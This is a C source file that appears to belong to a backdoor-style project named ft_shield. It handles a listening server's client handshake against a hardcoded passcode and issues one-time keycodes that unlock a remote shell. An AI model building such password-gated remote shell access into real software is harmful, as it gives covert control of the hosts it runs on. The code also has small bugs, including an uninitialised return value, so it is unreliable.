#include "ft_shield.h"

bool search_password(t_server *server, char *input)
{
    t_list *lst = server->passwords;
    t_list *prev = NULL;

    while (lst)
    {
        if (strcmp(lst->content, input) == 0) {
            if (prev == NULL)
                server->passwords = lst->next;
            else
                prev->next = lst->next;
            
            dprintf(2, "password [%s] found and deleted\n", input);
            free(lst->content);
            free(lst);
            return (true);
        }
        prev = lst;
        lst = lst->next;
    }
    return (false);
}

void handle_handshake(t_server *server, int index, char *input)
{
	t_client *client = &server->clients[index];

	if (client->status == HANDSHAKE)
	{
		dprintf(2, "HANDSHAKE INPUT [%s]\n", input);
		if (search_password(server, input) == true) {
			shell_function(server, index);
			return ;
		}
		if (strcmp(PASSCODE, input) != 0) {
			dprintf(2, "Invalid KEY\n");
			return ;
		}
		dprintf(2, "Valid KEY\n");
		client->status = CONNECTED;
	}
	send(client->fd, "$> ", 3, 0);
}

void add_password(t_server *server, int index) {
	char *password = gen_random_password();

	t_list *new_node = ft_lstnew(password);

	ft_lstadd_back(&server->passwords, new_node);

	const int	client_fd = server->clients[index].fd;

	char msg_connection[300] = {0};

	sprintf(msg_connection, "To access the remote shell, use the next Keycode -> [%s]\n", password);
	send(client_fd, msg_connection, strlen(msg_connection), 0);
}

void delete_client(t_server *server, int index) {

	const int	client_fd = server->clients[index].fd;

	memset(&server->clients[index], 0, sizeof(t_client));
	close(client_fd);
}

int	handle_commands(t_server *server, int index, char *input)
{
	t_client *client = &server->clients[index];

	if (strcmp("clear", input) == 0)
	{
		send(client->fd, CLEAR_CODE, sizeof(CLEAR_CODE), 0);
	}
	else if (strcmp("shell", input) == 0)
	{
		dprintf(2, "client_fd: %d\n", client->fd);

		add_password(server, index);
		delete_client(server, index);
		// shell_function(server, index);

	}
	else if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
	{
		send(client->fd, HELP, sizeof(HELP), 0);
	}
	send(client->fd, "$> ", 3, 0);
	return (0);
}

int handle_input(t_server *server, int index, char *buffer)
{
	char	*input = ft_strtrim(buffer, TRIM_CHARS);
	int		fd;

	t_client *client = &server->clients[index];

	dprintf(2, "readed: [%s]\n", input);
	if (client->status == HANDSHAKE)
		handle_handshake(server, index, input);
	else if (client->status == CONNECTED)
		fd = handle_commands(server, index, input);
	free(input);
	return (fd);
}
